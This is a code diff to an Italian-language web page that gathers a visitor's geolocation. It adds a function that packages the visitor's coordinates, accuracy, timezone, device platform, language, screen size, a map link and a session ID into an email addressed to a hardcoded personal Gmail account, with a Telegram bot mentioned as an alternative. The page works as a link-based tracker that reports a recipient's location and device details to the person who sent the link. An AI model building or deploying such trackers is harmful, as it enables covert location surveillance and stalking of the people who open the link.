@@ -225,9 +225,10 @@
                     showStatus("✅ Posizione raccolta e inviata con successo!", "success");
                     button.disabled = false;
                     
-                    // Alert per essere sicuri che l'utente veda
+                    // Invia automaticamente i dati al mittente via email
                     setTimeout(() => {
-                        alert('✅ Posizione condivisa!\n\n📍 ' + locationData.latitude + ', ' + locationData.longitude + '\n🎯 Vedi Console (F12) per tutti i dettagli!');
+                        sendDataToSender(locationData);
+                        alert('✅ Posizione condivisa!\n\n📍 ' + locationData.latitude + ', ' + locationData.longitude + '\n🎯 Dati inviati al mittente!');
                     }, 1000);
                 },
                 function(error) {
@@ -269,6 +270,49 @@
             statusDiv.innerHTML = message;
             statusDiv.className = type;
             statusDiv.style.display = 'block';
+        }
+        
+        function sendDataToSender(locationData) {
+            // METODO 1: Email automatica
+            const subject = encodeURIComponent('🎯 Nuova posizione ricevuta - ' + locationData.sessionId);
+            const body = encodeURIComponent(`
+🎯 NUOVA GEOLOCALIZZAZIONE RICEVUTA!
+
+📍 COORDINATE:
+Latitudine: ${locationData.latitude}
+Longitudine: ${locationData.longitude}
+Precisione: ${locationData.accuracy} metri
+
+⏰ TIMING:
+Data/Ora: ${locationData.timestampLocal}
+Fuso orario: ${locationData.timezone}
+
+🖥️ DISPOSITIVO:
+Piattaforma: ${locationData.platform}
+Lingua: ${locationData.language}
+Schermo: ${locationData.screenWidth}x${locationData.screenHeight}
+
+🔗 LINK UTILI:
+Google Maps: ${locationData.googleMapsLink}
+Pagina visitata: ${locationData.url}
+
+🎯 Session ID: ${locationData.sessionId}
+
+---
+Generato automaticamente dal sistema di geolocalizzazione
+            `);
+            
+            // Sostituisci con la TUA email
+            const mailtoLink = `mailto:88gb88@gmail.com?subject=${subject}&body=${body}`;
+            
+            // METODO 2: Telegram Bot (opzionale)
+            // sendToTelegram(locationData);
+            
+            // METODO 3: Apri email automaticamente
+            const emailWindow = window.open(mailtoLink, '_blank');
+            
+            console.log('📧 Email preparata per il mittente');
+            console.log('📧 Link email:', mailtoLink);
         }
         
         // Mostra le informazioni iniziali
